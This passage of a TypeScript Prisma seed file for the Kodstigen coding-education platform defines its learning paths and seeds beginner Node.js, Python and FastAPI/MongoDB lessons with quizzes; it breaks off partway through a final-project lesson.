import {
  PrismaClient,
  QuestionType,
  Prisma,
  type AchievementMetric,
  type ChallengeDifficulty,
  type ChallengeLanguage,
} from '@prisma/client';
import bcrypt from 'bcryptjs';

const prisma = new PrismaClient();

const paths = [
  {
    slug: 'cpp',
    name: 'C++',
    icon: '🟦',
    difficulty: 5,
    estimatedHours: 65,
    projectCount: 18,
    description: 'Master systems programming, memory management, and high-performance applications with C++.',
  },
  {
    slug: 'python',
    name: 'Python',
    icon: '🐍',
    difficulty: 2,
    estimatedHours: 80,
    projectCount: 21,
    description: 'The friendliest way into programming, scripting, automation, data, and AI with Python.',
  },
  {
    slug: 'javascript',
    name: 'JavaScript',
    icon: '🟨',
    difficulty: 3,
    estimatedHours: 70,
    projectCount: 25,
    description: 'The language of the web. Build interactive sites and apps that run everywhere.',
  },
  {
    slug: 'typescript',
    name: 'TypeScript',
    icon: '🔵',
    difficulty: 3,
    estimatedHours: 40,
    projectCount: 14,
    description: 'JavaScript with superpowers, static types, safer refactors, and scalable codebases.',
  },
  {
    slug: 'nodejs',
    name: 'Node.js',
    icon: '🟩',
    difficulty: 4,
    estimatedHours: 45,
    projectCount: 16,
    description: 'Server-side JavaScript, REST APIs, real-time apps, and backend engineering with Node.js.',
  },
  {
    slug: 'git',
    name: 'Git',
    icon: '🌿',
    difficulty: 2,
    estimatedHours: 20,
    projectCount: 5,
    description: 'Version control fundamentals, track changes, branch, merge, and collaborate with Git and GitHub.',
  },
  {
    slug: 'react',
    name: 'React',
    icon: '⚛️',
    difficulty: 3,
    estimatedHours: 50,
    projectCount: 16,
    description: 'Component-based UI development with React, JSX, props, state, hooks, and building real interactive apps.',
  },
  {
    slug: 'csharp',
    name: 'C#',
    icon: '🟣',
    difficulty: 3,
    estimatedHours: 45,
    projectCount: 14,
    description: 'Statically-typed, object-oriented programming with C# and the .NET ecosystem.',
  },
  {
    slug: 'sql',
    name: 'SQL',
    icon: '🗄️',
    difficulty: 3,
    estimatedHours: 55,
    projectCount: 11,
    description: 'Query, filter, join, and aggregate relational data with SQL, the language behind virtually every database-backed application.',
  },
  {
    slug: 'docker',
    name: 'Docker',
    icon: '🐳',
    difficulty: 3,
    estimatedHours: 20,
    projectCount: 6,
    description: 'Package, ship, and run applications anywhere with containers, images, Dockerfiles, and Docker Compose.',
  },
  {
    slug: 'azure',
    name: 'Azure',
    icon: '☁️',
    difficulty: 4,
    estimatedHours: 30,
    projectCount: 7,
    description: 'Deploy, host, and scale real applications in the cloud with Microsoft Azure.',
  },
  {
    slug: 'kubernetes',
    name: 'Kubernetes',
    icon: '☸️',
    difficulty: 4,
    estimatedHours: 30,
    projectCount: 7,
    description: 'Orchestrate containers at scale: Pods, Deployments, Services, config and storage, and real kubectl workflows.',
  },
  {
    slug: 'aws',
    name: 'AWS',
    icon: '📦',
    difficulty: 4,
    estimatedHours: 30,
    projectCount: 7,
    description: 'Regions and IAM, EC2, S3, VPC networking, and serverless with Lambda and API Gateway.',
  },
  {
    slug: 'cicd',
    name: 'CI/CD',
    icon: '♾️',
    difficulty: 3,
    estimatedHours: 20,
    projectCount: 6,
    description: 'Build real pipelines with GitHub Actions: automated testing, Docker image builds, deployment strategies, and pipeline secrets.',
  },
  {
    slug: 'observability',
    name: 'Observability',
    icon: '🔭',
    difficulty: 3,
    estimatedHours: 20,
    projectCount: 7,
    description: 'The three pillars of observability: structured logging, metrics and time-series data, distributed tracing, and alerting that does not burn out your team.',
  },
  {
    slug: 'ai-coding',
    name: 'AI Coding',
    icon: '🤖',
    difficulty: 2,
    estimatedHours: 15,
    projectCount: 5,
    description: 'Work effectively with AI coding assistants: writing clear prompts, giving the right context, and reviewing what they build.',
  },
  {
    slug: 'html',
    name: 'HTML',
    icon: '📄',
    difficulty: 1,
    estimatedHours: 20,
    projectCount: 8,
    description: 'The building blocks of every website: structure, semantics, forms, and accessibility with HTML.',
  },
  {
    slug: 'css',
    name: 'CSS',
    icon: '🎨',
    difficulty: 2,
    estimatedHours: 30,
    projectCount: 10,
    description: 'Style and lay out the web: the box model, Flexbox, Grid, responsive design, and animation with CSS.',
  },
  {
    slug: 'lua',
    name: 'Lua',
    icon: '🌙',
    difficulty: 2,
    estimatedHours: 25,
    projectCount: 8,
    description: 'A lightweight, embeddable scripting language used everywhere from game engines to Neovim configs.',
  },
  {
    slug: 'cybersecurity',
    name: 'Cybersecurity',
    icon: '🔒',
    difficulty: 3,
    estimatedHours: 35,
    projectCount: 10,
    description: 'Think like an attacker to defend like a pro: the CIA triad, common attack vectors, network and web app security, cryptography, and access control.',
  },
  {
    slug: 'c',
    name: 'C',
    icon: '🔧',
    difficulty: 4,
    estimatedHours: 45,
    projectCount: 11,
    description: 'Get close to the machine: structs, pointers, manual memory management, and build your own garbage collector from scratch.',
  },
  {
    slug: 'linux',
    name: 'Linux',
    icon: '🐧',
    difficulty: 2,
    estimatedHours: 20,
    projectCount: 7,
    description: 'The command line, filesystems, processes, permissions, and setting up a real development environment.',
  },
  {
    slug: 'java',
    name: 'Java',
    icon: '☕',
    difficulty: 3,
    estimatedHours: 45,
    projectCount: 7,
    description: 'Statically-typed, object-oriented programming on the JVM: classes, collections, generics, and interfaces.',
  },
  {
    slug: 'kotlin',
    name: 'Kotlin',
    icon: '🟠',
    difficulty: 3,
    estimatedHours: 40,
    projectCount: 7,
    description: 'A modern, concise language for the JVM and Android: null safety, data classes, extension functions, and idiomatic Java interop.',
  },
  {
    slug: 'go',
    name: 'Go',
    icon: '🐹',
    difficulty: 3,
    estimatedHours: 35,
    projectCount: 8,
    description: 'A simple, fast, compiled language built for concurrency: structs, goroutines, channels, and error handling.',
  },
  {
    slug: 'solidity',
    name: 'Solidity',
    icon: '⛓️',
    difficulty: 4,
    estimatedHours: 30,
    projectCount: 7,
    description: 'Write smart contracts for Ethereum: state variables, functions and visibility, access control, mappings, and events.',
  },
  {
    slug: 'gdscript',
    name: 'GDScript',
    icon: '🎮',
    difficulty: 2,
    estimatedHours: 25,
    projectCount: 7,
    description: "Godot's built-in scripting language: nodes, the scene tree, signals, and building real gameplay behavior.",
  },
  {
    slug: 'public',
    name: 'Public Paths',
    icon: '🔓',
    difficulty: 1,
    estimatedHours: 2,
    projectCount: 1,
    description: 'Free sample courses, no account needed to try the first lesson.',
  },
];

type SeedQuestion = {
  type: QuestionType;
  prompt: string;
  options: string[];
  answer: string;
};

type SeedLesson = {
  title: string;
  content: string;
  videoUrl?: string;
  requiresSubmission?: boolean;
  quiz?: { title: string; passingScore: number; questions: SeedQuestion[] };
};

function lessonContent(title: string, body: string): string {
  return `# ${title}\n\n${body}`;
}

const nodeLessons: SeedLesson[] = [
  {
    title: 'Introduction to Node.js',
    content: lessonContent(
      'Introduction to Node.js',
      `Node.js is a JavaScript runtime built on Chrome's V8 engine. It lets you run JavaScript outside the browser, on servers, in CLIs, and in build tools.\n\n## Why Node.js?\n\n- **Non-blocking I/O**, handles thousands of concurrent connections efficiently.\n- **One language everywhere**, share code and skills between frontend and backend.\n- **npm**, the largest package ecosystem in the world.\n\n## Your first program\n\n\`\`\`js\n// hello.js\nconsole.log('Hello from Node.js!');\n\`\`\`\n\nRun it with:\n\n\`\`\`bash\nnode hello.js\n\`\`\``
    ),
    quiz: {
      title: 'Node.js Basics',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What engine does Node.js use to execute JavaScript?',
          options: ['SpiderMonkey', 'V8', 'JavaScriptCore', 'Chakra'],
          answer: 'V8',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Node.js can only run JavaScript inside a web browser.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command to run a file called app.js with Node is: ____ app.js',
          options: [],
          answer: 'node',
        },
      ],
    },
  },
  {
    title: 'Variables and Data Types',
    content: lessonContent(
      'Variables and Data Types',
      `JavaScript in Node.js supports \`let\`, \`const\`, and (legacy) \`var\`.\n\n\`\`\`js\nconst name = 'Kodstigen';   // cannot be reassigned\nlet xp = 0;                 // can be reassigned\nxp += 10;\n\nconsole.log(name, 'has', xp, 'XP');\nconsole.log('typeof name:', typeof name);\n\`\`\`\n\n## Core types\n\n| Type | Example |\n|------|---------|\n| string | \`'hello'\` |\n| number | \`42\`, \`3.14\` |\n| boolean | \`true\` |\n| object | \`{ id: 1 }\` |\n| array | \`[1, 2, 3]\` |\n| null / undefined | absence of value |\n\nPrefer \`const\` by default; use \`let\` only when you need to reassign.`
    ),
    quiz: {
      title: 'Variables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which keyword declares a variable that cannot be reassigned?',
          options: ['var', 'let', 'const', 'static'],
          answer: 'const',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the output of: console.log(typeof [1, 2, 3])',
          options: ['array', 'object', 'list', 'undefined'],
          answer: 'object',
        },
      ],
    },
  },
  {
    title: 'Functions and Modules',
    content: lessonContent(
      'Functions and Modules',
      `## Functions\n\n\`\`\`js\nfunction add(a, b) {\n  return a + b;\n}\n\nconst multiply = (a, b) => a * b;\n\nconsole.log('add(2, 3) =', add(2, 3));\nconsole.log('multiply(4, 5) =', multiply(4, 5));\n\`\`\`\n\n## ES Modules\n\nSplit code across files with \`import\`/\`export\` (module files need a real Node.js project, so this example is read-only):\n\n\`\`\`\n// math.js\nexport function add(a, b) {\n  return a + b;\n}\n\n// app.js\nimport { add } from './math.js';\nconsole.log(add(2, 3)); // 5\n\`\`\`\n\nSet \`"type": "module"\` in package.json to use ES modules natively.`
    ),
    quiz: {
      title: 'Functions & Modules Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'To bring a named export into another file you use the ____ keyword.',
          options: [],
          answer: 'import',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Arrow functions are declared with the => syntax.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Building an Express Server',
    content: lessonContent(
      'Building an Express Server',
      `Express is the most popular web framework for Node.js.\n\n\`\`\`\nimport express from 'express';\n\nconst app = express();\napp.use(express.json());\n\napp.get('/api/health', (req, res) => {\n  res.json({ status: 'ok' });\n});\n\napp.listen(4000, () => console.log('Listening on :4000'));\n\`\`\`\n\n*Server code runs in Node.js, not in the browser playground, you'll run this for real in the final project.*\n\n## Key concepts\n\n- **Routes** map an HTTP method + path to a handler.\n- **Middleware** functions run in order before your handler (parsing, auth, logging).\n- **req / res**, the request and response objects.`
    ),
    quiz: {
      title: 'Express Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which middleware parses incoming JSON request bodies?',
          options: ['express.static()', 'express.json()', 'express.router()', 'express.parse()'],
          answer: 'express.json()',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What HTTP method is typically used to create a new resource?',
          options: ['GET', 'POST', 'DELETE', 'HEAD'],
          answer: 'POST',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Middleware functions execute after the final route handler sends its response.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'REST APIs and Authentication',
    content: lessonContent(
      'REST APIs and Authentication',
      `## REST conventions\n\n| Method | Path | Meaning |\n|--------|------|---------|\n| GET | /api/courses | list courses |\n| GET | /api/courses/:id | one course |\n| POST | /api/courses | create |\n| PUT | /api/courses/:id | update |\n| DELETE | /api/courses/:id | delete |\n\n## JWT authentication\n\n1. User logs in with credentials.\n2. Server verifies and signs a **JSON Web Token**.\n3. Client sends it back on every request: \`Authorization: Bearer <token>\`.\n4. Middleware verifies the signature and attaches the user to the request.\n\nNever store plain-text passwords, hash them with bcrypt.`
    ),
    quiz: {
      title: 'REST & Auth Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'JWTs are sent in the Authorization header using the ____ scheme.',
          options: [],
          answer: 'Bearer',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which library is commonly used to hash passwords in Node.js?',
          options: ['md5', 'bcrypt', 'base64', 'crypto-random'],
          answer: 'bcrypt',
        },
      ],
    },
  },
  {
    title: 'Final Project: URL Shortener',
    content: lessonContent(
      'Final Project: URL Shortener',
      `Time to put it all together. Build a URL shortener API with:\n\n## Requirements\n\n1. \`POST /api/links\`, accepts a long URL, returns a short code.\n2. \`GET /:code\`, redirects to the original URL.\n3. \`GET /api/links/:code/stats\`, visit count and creation date.\n4. Persist links in PostgreSQL.\n5. Validate URLs and handle unknown codes with a 404.\n\n## Stretch goals\n\n- Rate limiting\n- Custom short codes\n- Expiring links\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const pythonLessons: SeedLesson[] = [
  {
    title: 'Getting Started with Python',
    content: lessonContent(
      'Getting Started with Python',
      `Python is one of the most popular programming languages in the world, and one of the friendliest for beginners. It's used for everything from web apps and automation scripts to data science and AI.\n\n## Your first program\n\n\`\`\`python\nprint("Hello, Kodstigen!")\n\nname = "student"\nxp = 0\nxp += 10\nprint(f"{name} has {xp} XP")\n\`\`\`\n\n## Reading it line by line\n\n- \`print(...)\` writes text to the console, it's usually the very first thing anyone learns in any language.\n- \`name = "student"\` creates a **variable**, a named container for a value, Python figures out the type (here, a piece of text) automatically, you never have to declare it up front.\n- \`xp += 10\` is shorthand for \`xp = xp + 10\`, add 10 to whatever \`xp\` already is.\n- \`f"{name} has {xp} XP"\` is an **f-string**, the \`f\` right before the quotes lets you embed variables directly inside \`{ }\`, without it you'd have to write something clunkier like \`name + " has " + str(xp) + " XP"\`.\n\n## No semicolons, no braces\n\nUnlike many languages, Python doesn't use \`{ }\` to mark where a block of code starts and ends, it uses **indentation** (consistent spaces at the start of a line) instead. Get the indentation wrong and Python refuses to run your code, that's a feature, not a bug, it forces code to stay readable.\n\n> [!TIP]\n> Comments start with \`#\` and are ignored when the program runs, use them to explain *why* you did something, not just *what* the code does.`
    ),
    quiz: {
      title: 'Python Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How does Python define code blocks?',
          options: ['Curly braces', 'Indentation', 'Keywords begin/end', 'Parentheses'],
          answer: 'Indentation',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The built-in function to display output to the console is ____().',
          options: [],
          answer: 'print',
        },
      ],
    },
  },
  {
    title: 'Lists, Dicts, and Loops',
    content: lessonContent(
      'Lists, Dicts, and Loops',
      `Two of Python's most-used data structures are **lists** (ordered collections) and **dictionaries** (key-value pairs).\n\n\`\`\`python\nlanguages = ["python", "javascript", "cpp"]\nscores = {"python": 95, "javascript": 88}\n\nfor lang in languages:\n    print(lang.upper())\n\n# List comprehension\nlengths = [len(lang) for lang in languages]\nprint("lengths:", lengths)\nprint("python score:", scores["python"])\n\`\`\`\n\n## Lists\n\n\`languages\` is a **list**, an ordered, mutable (changeable) collection. Access an item by its position, starting from \`0\`, so \`languages[0]\` is \`"python"\`. Lists can hold any mix of types and grow or shrink with methods like \`.append(...)\`.\n\n## Dictionaries\n\n\`scores\` is a **dict**, it maps **keys** (like \`"python"\`) to **values** (like \`95\`), instead of positions. Look up a value with \`scores["python"]\`, trying to access a key that doesn't exist raises an error.\n\n## Loops\n\n\`for lang in languages:\` visits every item in the list, one at a time, \`lang\` is a new variable holding the current item on each pass.\n\n## List comprehensions\n\n\`[len(lang) for lang in languages]\` builds a brand-new list in a single line. Read it right to left: "for each \`lang\` in \`languages\`, compute \`len(lang)\`, and collect the results into a list." It's exactly equivalent to:\n\n\`\`\`python\nlengths = []\nfor lang in languages:\n    lengths.append(len(lang))\n\`\`\`\n\njust shorter, once the pattern clicks, you'll use it constantly.`
    ),
    quiz: {
      title: 'Collections Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does len(["a", "b", "c"]) return?',
          options: ['2', '3', '"abc"', 'an error'],
          answer: '3',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Python dictionaries map keys to values.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Functions and Error Handling',
    content: lessonContent(
      'Functions and Error Handling',
      `A **function** is a named, reusable block of code, you define it once and call it as many times as you need.\n\n\`\`\`python\ndef divide(a: float, b: float) -> float:\n    if b == 0:\n        raise ValueError("Cannot divide by zero")\n    return a / b\n\ntry:\n    print("10 / 2 =", divide(10, 2))\n    print("10 / 0 =", divide(10, 0))\nexcept ValueError as err:\n    print(f"Error: {err}")\n\`\`\`\n\n## Defining a function\n\n\`def divide(a, b):\` starts a function definition, \`a\` and \`b\` are **parameters**, placeholders for whatever values get passed in when the function is called. \`return\` sends a value back to whoever called the function, once \`return\` runs, the function stops immediately.\n\n## Type hints\n\n\`a: float, b: float) -> float\` are **type hints**, they document what types a function expects and returns. Python doesn't enforce them at runtime (you *could* still pass in the wrong type), but they help tools, editors, and other developers understand your code, and catch mistakes early.\n\n## Handling errors\n\nSometimes something goes wrong that a function can't recover from itself, dividing by zero, a missing file, invalid input. Python handles this with **exceptions**:\n\n- \`raise ValueError("...")\` signals "something is wrong" and stops normal execution.\n- \`try:\` wraps code that might fail.\n- \`except ValueError as err:\` catches that specific kind of error if it happens, letting your program respond gracefully instead of crashing.\n\nWithout the \`try\`/\`except\`, calling \`divide(10, 0)\` would crash the whole program the moment the \`ValueError\` was raised.`
    ),
    quiz: {
      title: 'Functions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'The keyword used to define a function in Python is ____.',
          options: [],
          answer: 'def',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which block catches an exception raised inside try?',
          options: ['catch', 'rescue', 'except', 'finally'],
          answer: 'except',
        },
      ],
    },
  },
  {
    title: 'Working with Files',
    content: lessonContent(
      'Working with Files',
      `Programs are more useful when they can save data between runs. Python's built-in \`open()\` reads and writes files.\n\n\`\`\`python\nwith open("scores.txt", "w") as f:\n    f.write("Ada,95\\n")\n    f.write("Grace,98\\n")\n\nwith open("scores.txt", "r") as f:\n    for line in f:\n        name, score = line.strip().split(",")\n        print(f"{name}: {score}")\n\`\`\`\n\n## The \`with\` statement\n\n\`with open(...) as f:\` opens the file and guarantees it gets closed automatically when the block ends, even if an error happens inside it. Without \`with\`, you'd have to remember to call \`f.close()\` yourself.\n\n## Common modes\n\n| Mode | Meaning |\n|------|---------|\n| \`"r"\` | Read (default), errors if the file doesn't exist |\n| \`"w"\` | Write, creates the file or overwrites it completely |\n| \`"a"\` | Append, adds to the end without erasing existing content |`
    ),
    quiz: {
      title: 'Files Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which file mode adds new content to the end of a file without erasing what is already there?',
          options: ['"r"', '"w"', '"a"', '"x"'],
          answer: '"a"',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The `with` statement automatically closes a file when its block ends.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Opening a file for writing, overwriting any existing content, uses mode ____.',
          options: [],
          answer: 'w',
        },
      ],
    },
  },
  {
    title: 'Classes and Objects',
    content: lessonContent(
      'Classes and Objects',
      `A **class** is a blueprint for creating objects that bundle data and behavior together.\n\n\`\`\`python\nclass Student:\n    def __init__(self, name, xp=0):\n        self.name = name\n        self.xp = xp\n\n    def gain_xp(self, amount):\n        self.xp += amount\n        return self.xp\n\nada = Student("Ada")\nada.gain_xp(50)\nprint(f"{ada.name} has {ada.xp} XP")\n\ngrace = Student("Grace", xp=10)\ngrace.gain_xp(5)\nprint(f"{grace.name} has {grace.xp} XP")\n\`\`\`\n\n## Key pieces\n\n- \`__init__\` is the **constructor**, it runs automatically whenever you create a new instance with \`Student(...)\`.\n- \`self\` refers to the specific instance a method was called on, it's always the first parameter of an instance method.\n- Each instance (\`ada\`, \`grace\`) keeps its own independent copy of the data set in \`__init__\`.`
    ),
    quiz: {
      title: 'Classes Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'The constructor method that runs automatically when a new instance is created is called ____.',
          options: [],
          answer: '__init__',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does `self` refer to inside an instance method?',
          options: ['The class itself', 'The instance the method was called on', 'The parent class', 'Nothing, it is optional'],
          answer: 'The instance the method was called on',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Two instances of the same class always share the same attribute values.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Contact Book CLI',
    content: lessonContent(
      'Final Project: Contact Book CLI',
      `Time to combine everything, functions, collections, classes, and files, into one program.\n\n## Requirements\n\n1. Represent each contact with a class (or dictionary) storing a name, phone number, and email.\n2. Support adding a new contact and listing all contacts.\n3. Support searching for a contact by name, and handle the case where no match is found without crashing.\n4. Persist contacts to a text or JSON file so they survive between runs, using what you learned about file I/O.\n5. Write at least one function with a clear docstring and type hints.\n\n## Stretch goals\n\n- Support deleting a contact.\n- Sort the contact list alphabetically by name.\n- Use the \`json\` module to save and load contacts as structured JSON instead of plain text.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const mongoFastApiLessons: SeedLesson[] = [
  {
    title: 'Why FastAPI and MongoDB?',
    content: lessonContent(
      'Why FastAPI and MongoDB?',
      `You've learned Python the language, now let's build a real backend with it. **FastAPI** is a modern, high-performance Python web framework, and **MongoDB** is a NoSQL database that stores flexible, JSON-like documents instead of rigid rows and columns.\n\n## Why FastAPI\n\n- **Fast to write**, path operations are plain Python functions with type hints.\n- **Automatic validation**, request and response data is checked against the types you declare.\n- **Free interactive docs**, every API automatically gets a Swagger UI page at \`/docs\`.\n- **Async-first**, built to handle many concurrent requests efficiently.\n\n## Why MongoDB\n\nA relational database (like the PostgreSQL you may have used with SQL) stores data in tables with a fixed set of columns. MongoDB stores **documents**, JSON-like objects that can have nested data and don't all need identical fields:\n\n\`\`\`\n{\n  "_id": "64f1b2c3d4e5f6",\n  "title": "Buy groceries",\n  "done": false,\n  "tags": ["errands", "urgent"]\n}\n\`\`\`\n\n> [!NOTE]\n> Neither approach is "better", relational databases shine when your data has clear, stable structure and relationships; document databases shine when your data is nested, varies shape, or evolves quickly.`
    ),
    quiz: {
      title: 'FastAPI & MongoDB Intro Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does FastAPI automatically generate for every API you build?',
          options: ['A mobile app', 'Interactive documentation at /docs', 'A MongoDB cluster', 'CSS styles'],
          answer: 'Interactive documentation at /docs',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'MongoDB stores data as flexible, JSON-like ____ instead of rows in a fixed table.',
          options: [],
          answer: 'documents',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every document in a MongoDB collection must have exactly the same fields.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Setting Up FastAPI and MongoDB',
    content: lessonContent(
      'Setting Up FastAPI and MongoDB',
      `## 1. Install the pieces\n\n\`\`\`bash\npip install fastapi uvicorn motor\n\`\`\`\n\n- \`fastapi\`, the web framework itself.\n- \`uvicorn\`, the server that actually runs your FastAPI app.\n- \`motor\`, the official **async** MongoDB driver for Python.\n\n## 2. A minimal app\n\n\`\`\`\nfrom fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get("/")\nasync def root():\n    return {"message": "Hello, Kodstigen!"}\n\`\`\`\n\nRun it with:\n\n\`\`\`bash\nuvicorn main:app --reload\n\`\`\`\n\n\`--reload\` restarts the server automatically whenever you save a file, handy during development.\n\n## 3. Connecting to MongoDB\n\n\`\`\`\nfrom motor.motor_asyncio import AsyncIOMotorClient\n\nclient = AsyncIOMotorClient("mongodb://localhost:27017")\ndb = client.kodstigen_db\ntasks_collection = db.tasks\n\`\`\`\n\nA MongoDB server organizes data into **databases**, which contain **collections** (roughly, a collection is like a table), which contain **documents** (roughly, a document is like a row).`
    ),
    quiz: {
      title: 'Setup Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which package actually runs (serves) a FastAPI application?',
          options: ['fastapi', 'uvicorn', 'motor', 'pip'],
          answer: 'uvicorn',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Running uvicorn with the ____ flag restarts the server automatically when files change.',
          options: [],
          answer: '--reload',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In MongoDB, a collection contains documents, similar to how a table contains rows.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Defining Data Models with Pydantic',
    content: lessonContent(
      'Defining Data Models with Pydantic',
      `FastAPI uses **Pydantic** models to describe the shape of your data, then automatically validates incoming requests against them.\n\n\`\`\`\nfrom pydantic import BaseModel\nfrom typing import Optional\n\nclass Task(BaseModel):\n    title: str\n    done: bool = False\n    tags: list[str] = []\n\nclass TaskOut(Task):\n    id: str\n\`\`\`\n\n## What this buys you\n\n- If a request is missing \`title\`, or sends the wrong type, FastAPI rejects it with a clear \`422\` error automatically, your code never even runs.\n- \`done: bool = False\` gives that field a default, so callers don't have to include it.\n- \`TaskOut\` reuses \`Task\` and adds an \`id\` field, useful for responses (which include a database-assigned id) versus requests (which don't have one yet).\n\n> [!TIP]\n> Think of Pydantic models as the FastAPI equivalent of a SQL table schema, they're where you write down the "shape" your data must have.`
    ),
    quiz: {
      title: 'Pydantic Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What happens if a request body is missing a required field on a Pydantic model?',
          options: [
            'FastAPI fills it in with null',
            'FastAPI automatically rejects the request with a validation error',
            'The server crashes',
            'The field is silently ignored',
          ],
          answer: 'FastAPI automatically rejects the request with a validation error',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Pydantic model classes inherit from ____.',
          options: [],
          answer: 'BaseModel',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Giving a field a default value, like `done: bool = False`, makes it optional in requests.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Basic CRUD with Motor',
    content: lessonContent(
      'Basic CRUD with Motor',
      `Motor's methods mirror MongoDB's query language closely, and every call is \`async\`.\n\n\`\`\`\n# Create\nresult = await tasks_collection.insert_one({"title": "Buy groceries", "done": False})\nnew_id = result.inserted_id\n\n# Read one\ntask = await tasks_collection.find_one({"_id": new_id})\n\n# Read many\ncursor = tasks_collection.find({"done": False})\nincomplete_tasks = await cursor.to_list(length=100)\n\n# Update\nawait tasks_collection.update_one({"_id": new_id}, {"$set": {"done": True}})\n\n# Delete\nawait tasks_collection.delete_one({"_id": new_id})\n\`\`\`\n\n## Reading the pieces\n\n- The first argument to each method is a **filter**, a document describing which record(s) to match, \`{}\` matches everything.\n- \`find()\` returns a **cursor**, not the data itself, you iterate it (or call \`.to_list()\`) to actually fetch documents.\n- \`update_one\` needs an update operator like \`$set\`, MongoDB won't just replace the whole document unless you ask it to.`
    ),
    quiz: {
      title: 'CRUD Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does tasks_collection.find({...}) return?',
          options: ['A list of documents directly', 'A single document', 'A cursor you iterate to get documents', 'A count'],
          answer: 'A cursor you iterate to get documents',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To update specific fields on a document without replacing the whole thing, you use the ____ operator.',
          options: [],
          answer: '$set',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every Motor method call must be awaited.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Building REST Endpoints',
    content: lessonContent(
      'Building REST Endpoints',
      `Wiring a Pydantic model and Motor together inside a path operation gives you a real REST endpoint.\n\n\`\`\`\nfrom fastapi import FastAPI, HTTPException\n\napp = FastAPI()\n\n@app.post("/tasks", response_model=TaskOut)\nasync def create_task(task: Task):\n    result = await tasks_collection.insert_one(task.model_dump())\n    created = await tasks_collection.find_one({"_id": result.inserted_id})\n    return {**created, "id": str(created["_id"])}\n\n@app.get("/tasks/{task_id}", response_model=TaskOut)\nasync def get_task(task_id: str):\n    task = await tasks_collection.find_one({"_id": ObjectId(task_id)})\n    if task is None:\n        raise HTTPException(status_code=404, detail="Task not found")\n    return {**task, "id": str(task["_id"])}\n\`\`\`\n\n## Key ideas\n\n- \`{task_id}\` in the route path becomes a function parameter automatically, FastAPI calls this **path parameter binding**.\n- \`task: Task\` as a parameter tells FastAPI to parse and validate the request body as a \`Task\`.\n- \`response_model=TaskOut\` shapes and validates what gets sent back, and shows up correctly in the auto-generated docs.\n- Raising \`HTTPException\` is how you return a non-200 status code with a message.`
    ),
    quiz: {
      title: 'Endpoints Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How do you return a 404 response from inside a FastAPI path operation?',
          options: ['return 404', 'raise HTTPException(status_code=404, ...)', 'app.error(404)', 'response.status = 404'],
          answer: 'raise HTTPException(status_code=404, ...)',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Writing {task_id} inside a route path like "/tasks/{task_id}" is called a path ____.',
          options: [],
          answer: 'parameter',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Declaring a parameter as `task: Task` tells FastAPI to validate the request body against the Task model.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Task API with FastAPI & MongoDB',
    content: lessonContent(
      'Final Project: Build a Task API with FastAPI & MongoDB',
